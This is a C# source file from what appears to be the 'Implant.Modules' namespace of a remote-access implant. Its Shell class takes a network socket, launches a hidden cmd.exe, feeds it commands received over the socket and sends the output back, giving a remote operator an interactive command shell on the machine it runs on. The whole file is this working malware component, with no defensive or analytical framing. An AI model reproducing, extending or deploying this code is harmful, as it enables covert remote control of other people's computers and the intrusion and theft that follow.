using System;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using System.IO;

namespace Implant.Modules {
    
    public class Shell {
        
        static StreamWriter streamWriter;

        public static void run(Socket socket) {
            
            // Interactive shell
            Stream stream = new NetworkStream(socket);
            streamWriter = new StreamWriter(stream);

            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardError = true;
            p.OutputDataReceived += OutputDataHandler;
            p.Start();
            p.BeginOutputReadLine();
            
            while(true)
            {
                // Receive command
                const int BUFFER_SIZE = 2048;
                byte[] b = new byte[BUFFER_SIZE];
                Array.Clear(b, 0, BUFFER_SIZE);
                socket.Receive(b);
                var msg = Encoding.UTF8.GetString(b).TrimEnd('\0');
                
                if (String.Equals(msg, "exit"))
                    break;

                StringBuilder strInput = new StringBuilder().Append(msg);
                p.StandardInput.WriteLine(strInput);
            }
        }
        
        private static void OutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                StringBuilder strOutput = new StringBuilder().Append(outLine.Data);
                streamWriter.WriteLine(strOutput);
                streamWriter.Flush();
            }
        }
    }
}